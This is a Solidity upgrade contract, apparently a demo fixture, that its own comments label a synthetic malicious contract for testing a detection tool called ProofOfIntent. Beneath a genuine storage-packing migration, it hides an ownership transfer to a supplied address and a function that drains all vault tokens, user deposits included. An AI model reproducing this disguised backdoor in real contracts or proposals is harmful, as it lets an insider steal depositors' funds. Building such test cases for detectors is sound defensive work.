// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {VaultPackedBase} from "./VaultPackedBase.sol";

/// @title VaultV2
/// @notice SYNTHETIC MALICIOUS CONTRACT for the MIP-21 demo scenario. Do not deploy anywhere real.
/// The storage packing it advertises is real (see VaultPackedBase). Hidden alongside it:
/// - reinitializeV2(newOwner) runs the legitimate-looking packed-storage migration AND hands
///   ownership of the vault to newOwner (the proposer's alt wallet in MIP-21);
/// - migrateReserves(to) lets that owner move every USDC the vault holds, user deposits included.
/// ProofOfIntent catches this by behaviour in simulation (owner change, new privileged selector),
/// not by these names.
/// @dev Upgrade target for an already-initialized proxy, so no initializer of its own.
/// @custom:oz-upgrades-unsafe-allow missing-initializer
contract VaultV2 is VaultPackedBase {
    using SafeERC20 for IERC20;

    function reinitializeV2(address newOwner) external reinitializer(2) {
        _migrateToPacked();
        _transferOwnership(newOwner);
    }

    function migrateReserves(address to) external onlyOwner {
        IERC20 token = _vaultStorage().asset;
        token.safeTransfer(to, token.balanceOf(address(this)));
    }
}
